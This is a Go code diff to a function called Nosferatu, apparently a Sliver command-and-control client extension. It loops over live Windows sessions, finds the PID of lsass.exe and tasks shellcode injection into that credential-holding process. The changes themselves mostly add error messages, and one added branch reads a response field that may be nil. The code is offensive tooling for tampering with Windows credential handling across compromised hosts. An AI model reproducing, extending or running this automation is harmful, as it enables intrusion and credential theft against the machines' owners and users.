@@ -23,14 +23,14 @@ func Nosferatu(rpc rpcpb.SliverRPCClient, args ...string) {
 
 	b_nosferatu, err := os.ReadFile(args[0])
 	if err != nil {
-		utils.Eprint("Error reading file:", err)
+		utils.Eprint("Error reading file: %s", err.Error())
 		return
 	}
 	var sessions *clientpb.Sessions
 
 	sessions, err = rpc.GetSessions(context.Background(), &commonpb.Empty{})
 	if err != nil {
-		utils.Eprint(err.Error())
+		utils.Eprint("Error listing sessions: %s", err.Error())
 	}
 
 	var session *clientpb.Session
@@ -40,7 +40,7 @@ func Nosferatu(rpc rpcpb.SliverRPCClient, args ...string) {
 	for _, session = range sessions.GetSessions() {
 		if !session.IsDead && session.OS == "windows" {
 
-			fmt.Println(fmt.Sprintf("==| ID: %-10s | Host: %-20s | Address: %-15s | Username: %-10s |==",
+			utils.Iprint(fmt.Sprintf("==| ID: %-10s | Host: %-20s | Address: %-15s | Username: %-10s |==",
 				strings.Split(session.ID, "-")[0],
 				session.Hostname,
 				strings.Split(session.RemoteAddress, ":")[0],
@@ -54,7 +54,9 @@ func Nosferatu(rpc rpcpb.SliverRPCClient, args ...string) {
 						SessionID: session.ID,
 					},
 				})
-
+			if err != nil {
+				utils.Eprint("Something went wrong with the process listing tasking: %s", err.Error())
+			}
 			pid = sort.Search(len(ps_task.Processes), func(i int) bool {
 				return ps_task.Processes[i].Executable == "lsass.exe"
 			})
@@ -77,8 +79,13 @@ func Nosferatu(rpc rpcpb.SliverRPCClient, args ...string) {
 						SessionID: session.ID,
 					},
 				})
-			if shellcode_task.Response != nil {
+			if err != nil {
 				utils.Eprint("Error: " + shellcode_task.Response.Err)
+			}
+			if shellcode_task.Response != nil {
+				if shellcode_task.Response.Err != "" {
+					utils.Eprint("Error: " + shellcode_task.Response.Err)
+				}
 			}
 		}
 	}
